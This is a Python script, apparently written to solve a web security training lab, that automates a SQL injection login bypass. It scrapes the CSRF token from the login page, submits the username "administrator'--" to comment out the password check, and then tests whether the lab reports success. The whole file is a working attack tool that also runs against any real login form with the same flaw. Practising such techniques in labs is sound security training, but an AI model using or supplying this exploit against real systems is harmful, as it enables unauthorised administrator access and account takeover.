import sys
import requests
from bs4 import BeautifulSoup

def verify_if_lab_solved(url):

    response = requests.get(url + "/")

    if "you solved the lab!".lower() in response.text:
        print("[+] Solved the lab successfully")
    else:
        print("[!] LAB NOT SOLVED, please check manually once")

def run_sql_payload(url):

    print()
    print(f"[*] Sending request as POST {url}/login")
    print()

    url = url + "/login"

    data = {
         "username": "administrator'--",
         "password": "faketemppassword",
    }

    s = requests.Session()

    print("[+] Sending GET request to /login to get the csrf token")
    response = s.get(url=url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")["value"]
    print(f"CSRF TOKEN: {csrf_token}")

    data["csrf"] = csrf_token

    response = s.post(url=url,data=data)

    print()
    print(f"Request Method: {response.request.method}")
    print(f"Request Url: {response.request.url}")
    print(f"Request Headers: {response.request.headers}")
    print(f"Request Body: {response.request.body}")
    print()    

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage: python file.py https://website.net")
    else:
        url = sys.argv[1].strip("/")
        run_sql_payload(url)
        verify_if_lab_solved(url)
